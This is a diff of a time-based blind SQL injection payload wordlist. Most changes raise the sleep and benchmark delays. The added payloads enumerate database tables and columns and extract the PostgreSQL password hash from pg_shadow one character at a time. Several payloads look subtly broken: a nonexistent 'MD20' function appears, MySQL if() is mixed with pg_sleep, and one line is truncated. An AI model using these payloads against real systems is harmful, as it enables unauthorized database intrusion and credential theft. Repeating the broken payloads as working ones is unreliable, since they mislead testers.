@@ -15,10 +15,12 @@
 " WAITFOR DELAY '0:0:20'--
 " WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 " WHERE 1337=1337 RLIKE SLEEP(20)-- 1337
-" and 0=benchmark(3000000,MD20(1))%20%23
-" and 0=benchmark(3000000,MD20(1))%20--
-" and 0=benchmark(3000000,MD20(1))%20/*
-" or benchmark(10000000,MD20(1))#
+" and 0=benchmark(4000000,MD20(1))%20%23
+" and 0=benchmark(4000000,MD20(1))%20--
+" and 0=benchmark(4000000,MD20(1))%20/*
+" or benchmark(8000000, MD20(1))%20%23
+" or benchmark(8000000, MD20(1))%20--
+" or benchmark(8000000, MD20(1))%20/*
 " or pg_sleep(20)--
 " or sleep(20)#
 " or sleep(20)="
@@ -58,10 +60,10 @@
 ")) RLIKE SLEEP(20) AND (("1337" LIKE "1337
 ")) RLIKE SLEEP(20) AND (("1337"="1337
 ")) WAITFOR DELAY '0:0:20'--
-")) and 0=benchmark(3000000,MD20(1))%20%23
-")) and 0=benchmark(3000000,MD20(1))%20--
-")) and 0=benchmark(3000000,MD20(1))%20/*
-")) or benchmark(10000000,MD20(1))#
+")) and 0=benchmark(20000000,MD20(1))%20%23
+")) and 0=benchmark(20000000,MD20(1))%20--
+")) and 0=benchmark(20000000,MD20(1))%20/*
+")) or benchmark(20000000,MD20(1))#
 ")) or pg_sleep(20)--
 ")) or sleep(20)="
 ")) waitfor delay '0:0:20' --
@@ -139,7 +141,7 @@
 %' RLIKE SLEEP(20) AND '1337%'='1337
 %' WAITFOR DELAY '0:0:20'--
 %';SELECT PG_SLEEP(20)–
-%2c(select%20*%20from%20(select(sleep(10)))a)
+%2c(select%20*%20from%20(select(SLEEP(20)))a)
 &&SLEEP(20)
 &&SLEEP(20)#
 &&SLEEP(20)--
@@ -150,7 +152,7 @@
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY) OR '1337'='1337
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY)-- 1337
 ' AND (SELECT 3122 FROM (SELECT(SLEEP(20)))YYYY) AND '1337'='1337
-' AND (SELECT 8839 FROM (SELECT(SLEEP(10)))uzIY) AND 'mSUA'='mSUA
+' AND (SELECT 8839 FROM (SELECT(SLEEP(20)))uzIY) AND 'mSUA'='mSUA
 ' AND 1337=BENCHMARK(20000000,MD20(0x2076e7a207)) AND '1337'='1337
 ' AND 1337=BENCHMARK(20000000,MD20(0x774c20341)) AND '1337' LIKE '1337
 ' AND 1337=BENCHMARK(20000000,MD20(0x774c20341)) AND '1337'='1337
@@ -177,15 +179,41 @@
 ' WAITFOR DELAY '0:0:20'–-
 ' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 ' WHERE 1337=1337 RLIKE SLEEP(20)-- 1337
+' and (select * from (select(sleep(20)))a)--
 ' and 0=benchmark(3000000,MD20(1))%20%23
 ' and 0=benchmark(3000000,MD20(1))%20--
 ' and 0=benchmark(3000000,MD20(1))%20/*
+' and case when (substring(version(),1,1))='P' then pg_sleep(20) else sleep(20) end--
+' and extractvalue(1,concat(0x5c,(select pg_sleep(20)),0x5c))--
+' and if((select count
+' and if((select count() from pg_shadow where usename='postgres' and substring(password from 1 for 1)='')=1,pg_sleep(20),0)--
+' and if((select count(*) from information_schema.columns where table_name='users' and column_name='password')=1,pg_sleep(20),0)--
+' and if((select count(*) from information_schema.columns where table_name='users' and table_schema='public')=1,pg_sleep(20),0)--
+' and if((select count(*) from information_schema.columns where table_name='users')=1,pg_sleep(20),0)--
+' and if((select count(*) from information_schema.tables where table_schema='public' and table_name='users')=1,pg_sleep(20),0)--
+' and if((select count(*) from information_schema.tables where table_schema='public')=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_shadow where usename='postgres' and length(password)>1)=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_shadow where usename='postgres' and substring(password from 1 for 1)='$')=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_shadow where usename='postgres' and substring(password from 1 for 1)='md5')=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_shadow where usename='postgres' and substring(password from 1 for 3)='md5')=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_shadow where usename='postgres')=1,pg_sleep(20),0)--
+' and if((select count(*) from pg_user where usename='postgres')=1,pg_sleep(20),0)--
+' and if(ascii(substr((select column_name from information_schema.columns limit 1),1,1))=97,pg_sleep(20),0)--
+' and if(ascii(substr((select table_name from information_schema.tables limit 1),1,1))=97,pg_sleep(20),0)--
+' and if(length((select table_name from information_schema.tables limit 1))=1,pg_sleep(20),0)--
+' and if(length(current_database())=1,pg_sleep(20),0)--
+' and if(length(current_user)=1,pg_sleep(20),0)--
+' and if(length(database())=1,pg_sleep(20),0)--
+' and if(length(user)=1,pg_sleep(20),0)--
+' and if(substring((select version()),1,1)='P',pg_sleep(20),sleep(20))--
+' and pg_sleep(20)--
 ' and sleep 20
 ' and sleep 20 and '1'='1
 ' and sleep 20--
 ' and sleep(20)
 ' and sleep(20) and '1'='1
 ' and sleep(20)--
+' and updatexml(null,concat(0x5c,(select pg_sleep(20)),0x5c),null)--
 ' or benchmark(10000000,MD20(1))#
 ' or pg_sleep(20)--
 ' or sleep(20)#
@@ -350,10 +378,10 @@
 (select(0)from(select(sleep(20)))v)
 (select(0)from(select(sleep(20)))v)%2f'+(select(0)from(select(sleep(20)))v)+'"
 (select(0)from(select(sleep(20)))v)/'+(select(3)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"/
-(select*from(select(sleep(10)))a)
-(select*from(select(sleep(10)))a)#
-(select*from(select(sleep(10)))a)++
-(select*from(select(sleep(10)))a)--%20-
+(select*from(select(SLEEP(20)))a)
+(select*from(select(SLEEP(20)))a)#
+(select*from(select(SLEEP(20)))a)++
+(select*from(select(SLEEP(20)))a)--%20-
 (select*from(select(sleep(20)))a)
 (sleep 20)
 (sleep 20)--
@@ -371,9 +399,9 @@
 ) WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY)-- 1337
 ) WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20))-- 1337
 ) WHERE 1337=1337 RLIKE SLEEP(20)-- 1337
-) and 0=benchmark(3000000,MD20(1))%20%23
-) and 0=benchmark(3000000,MD20(1))%20--
-) and 0=benchmark(3000000,MD20(1))%20/*
+) and 0=benchmark(20000000,MD20(1))%20%23
+) and 0=benchmark(20000000,MD20(1))%20--
+) and 0=benchmark(20000000,MD20(1))%20/*
 ) waitfor delay '0:0:20' --
 ) waitfor delay '0:0:20' /*
 )%20waitfor%20delay%20'0:0:20'%20--
@@ -424,21 +452,19 @@
 ),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
 ),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
 );waitfor delay '0:0:20'--
-+ SLEEP(10) + '
 + SLEEP(20) + '
 +(SELECT 0x74764164 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20)))+
 +(SELECT 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(20)))YYYY))+
 +(SELECT 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(20)))+
 +(SELECT 1337 WHERE 1337=1337 RLIKE SLEEP(20))+
 +benchmark(3200,SHA1(1))+'
-, AND (SELECT 8839 FROM (SELECT(SLEEP(10)))uzIY) AND 'mSUA'='mSUA
-,(select * from (select(sleep(10)))a)
+, AND (SELECT 8839 FROM (SELECT(SLEEP(20)))uzIY) AND 'mSUA'='mSUA
 ,(select * from (select(sleep(20)))a)
-,(select*from(select(sleep(10)))a)
-,(select*from(select(sleep(10)))a)#
-,(select*from(select(sleep(10)))a)++
-,(select*from(select(sleep(10)))a)--
-,(select*from(select(sleep(10)))a)--%20-
+,(select*from(select(SLEEP(20)))a)
+,(select*from(select(SLEEP(20)))a)#
+,(select*from(select(SLEEP(20)))a)++
+,(select*from(select(SLEEP(20)))a)--
+,(select*from(select(SLEEP(20)))a)--%20-
 ,NULL)%20waitfor%20delay%20'0:0:20'%20--
 ,NULL)%20waitfor%20delay%20'0:0:20'%20/*
 ,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
@@ -457,15 +483,14 @@
 -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(20))A))
 -1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(20))A))(SELECT * FROM (SELECT(SLEEP(20)))YYYY)(SELECT * FROM (SELECT(SLEEP(20)))YYYY)#(SELECT * FROM (SELECT(SLEEP(20)))YYYY)--'+(select*from(select(sleep(20)))a)+'(select(0)from(select(sleep(20)))v)%2f'+(select(0)from(select(sleep(20)))v)+'"(select(0)from(select(sleep(20)))v)%2f*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*%2f(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/',''),/*test*/%26%26%09sLeEp(20)%09--+AND BLIND:1 and sleep 20--
 -BENCHMARK(100000000, rand())
--IF(MID(VERSION(),1,1) = '1', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '2', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '20', SLEEP(10), 0)
+-IF(MID(VERSION(),1,1) = '1', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '2', SLEEP(20), 0)
 -IF(MID(VERSION(),1,1) = '20', SLEEP(20), 0)
--IF(MID(VERSION(),1,1) = '3', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '4', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '6', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '7', SLEEP(10), 0)
--IF(MID(VERSION(),1,1) = '8', SLEEP(10), 0)
+-IF(MID(VERSION(),1,1) = '3', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '4', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '6', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '7', SLEEP(20), 0)
+-IF(MID(VERSION(),1,1) = '8', SLEEP(20), 0)
 -SLEEP(120)
 -sleep(20)
 0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
@@ -776,7 +801,7 @@ benchmark(200000000,MD20(1))#
 benchmark(200000000,MD20(1))--
 desc%2c(select*from(select(sleep(20)))a)
 if(now()=sysdate(),sleep(20),0)
-if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
+if(now()=sysdate(),sleep(20),0)/"XOR(if(now()=sysdate(),sleep(20),0))OR"/
 or SELECT SLEEP(20); #
 or SELECT pg_sleep(20);
 or SLEEP(20)
@@ -799,10 +824,8 @@ or sleep(20)--
 pg_SLEEP(20)
 pg_SLEEP(20)#
 pg_SLEEP(20)--
-pg_sleep(10)--
 pg_sleep(20)
 pg_sleep(20)--
-sleep(10)--
 sleep(20)#
 sleep(20)++
 sleep(20)--
